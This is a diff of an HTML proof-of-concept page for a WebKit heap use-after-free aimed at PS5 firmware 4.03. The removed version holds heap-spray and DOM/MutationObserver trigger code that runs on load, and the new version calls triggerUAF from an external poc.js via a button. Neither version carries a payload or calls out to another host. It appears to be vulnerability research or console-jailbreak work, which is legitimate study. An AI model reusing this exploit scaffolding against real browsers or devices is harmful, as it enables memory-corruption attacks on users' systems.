@@ -1,75 +1,50 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>PS5 4.03 - UAF Test (Real)</title>
-  <style>
-    body { background: #000; color: #0f0; font-family: monospace; }
-    #log { white-space: pre-wrap; }
-    .spray { width: 1px; height: 1px; overflow: hidden; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug ----- </title>
+    <style>
+      .container {
+        overflow: hidden;
+        content-visibility: auto;
+        transform: translateZ(0);
+        position: relative;
+        width: 200px;
+        height: 200px;
+      }
+      .child {
+        width: 100px;
+        height: 100px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        background: blue;
+        transform: translateZ(0);
+      }
+      button {
+        margin-top: 20px;
+        padding: 10px;
+        font-size: 16px;
+      }
+    </style>
 </head>
 <body>
-  <div id="log">[+] Iniciando PoC agresivo para PS5 FW 4.03...\n</div>
-
-  <script>
-    function log(msg) {
-      document.getElementById("log").textContent += msg + "\n";
-    }
-
-    const sprayArray = [];
-
-    function sprayStrings() {
-      log("[*] Realizando heap spray (cadenas)...");
-      for (let i = 0; i < 20000; i++) {
-        let str = "A".repeat(0x4000);
-        sprayArray.push(str + i);
-      }
-    }
-
-    function sprayBuffers() {
-      log("[*] Realizando heap spray (ArrayBuffers)...");
-      for (let i = 0; i < 10000; i++) {
-        let ab = new ArrayBuffer(0x1000);
-        let dv = new DataView(ab);
-        dv.setUint32(0, 0x41414141, true);
-        sprayArray.push(ab);
-      }
-    }
-
-    function trigger() {
-      log("[*] Preparando nodos para UAF...");
-      const container = document.createElement("div");
-      document.body.appendChild(container);
-
-      for (let i = 0; i < 1000; i++) {
-        const victim = document.createElement("div");
-        victim.style.contentVisibility = "auto";
-        victim.style.overflow = "hidden";
-        victim.className = "spray";
-        container.appendChild(victim);
-      }
-
-      log("[*] Realizando manipulación DOM...");
-      const observer = new MutationObserver(() => {
-        container.remove();
-        sprayBuffers(); // Ocupamos memoria tras liberación
-        sprayStrings(); // Reforzamos colisión
-        log("[!] Trigger lanzado. Observa cuelgue o comportamiento anómalo.");
-      });
-
-      observer.observe(container, { childList: true });
-      setTimeout(() => {
-        const elem = document.createElement("div");
-        elem.textContent = "trigger";
-        container.appendChild(elem);
-      }, 100);
-    }
-
-    window.onload = () => {
-      log("[+] PoC cargado correctamente.");
-      setTimeout(trigger, 500);
-    };
-  </script>
+    <h1>UAF: WebKit Heap Use-After-Free</h1>
+    <p>Click the button to see the bug in action. (Browser crashes or [+] UAF triggered)</p>
+    <button id="button">Click me</button>
+    <div class="container">
+      <div class="child"></div>
+    </div>
+    <script type="module">
+        import { triggerUAF } from './poc.js';
+        document.getElementById('button').addEventListener('click', () => {
+            try {
+                triggerUAF();
+            } catch (e) {
+                alert('Error: ' + e.message);
+            }
+        });
+    </script>
 </body>
 </html>
